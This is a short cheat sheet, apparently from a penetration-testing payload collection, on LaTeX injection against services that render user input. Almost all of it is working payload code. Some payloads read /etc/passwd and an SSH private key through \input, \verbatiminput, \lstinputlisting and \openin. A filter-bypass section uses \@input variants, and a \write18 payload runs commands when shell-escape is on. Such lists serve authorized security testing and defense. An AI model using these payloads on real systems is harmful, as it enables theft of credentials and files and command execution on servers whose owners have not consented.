# LaTeX Injection File Read

When user input is rendered as LaTeX (e.g. a math/formula renderer or report generator), inject LaTeX directives to read files.

```latex
# Read a file
\input{/etc/passwd}
\include{/etc/passwd}

# Read as verbatim (handles special chars)
\verbatiminput{/etc/passwd}

# Read arbitrary file via lstinputlisting (listings package)
\lstinputlisting{/home/user/.ssh/id_rsa}

# Use newread for binary-safe read
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\closein\file
\line
```

## Detection bypass

If `\input` and `\include` are filtered, try:
```latex
\@input{/etc/passwd}
\@@input /etc/passwd\relax
```

## Command execution (if `--shell-escape` is enabled)

```latex
\immediate\write18{id > /tmp/out}
\input{/tmp/out}
```
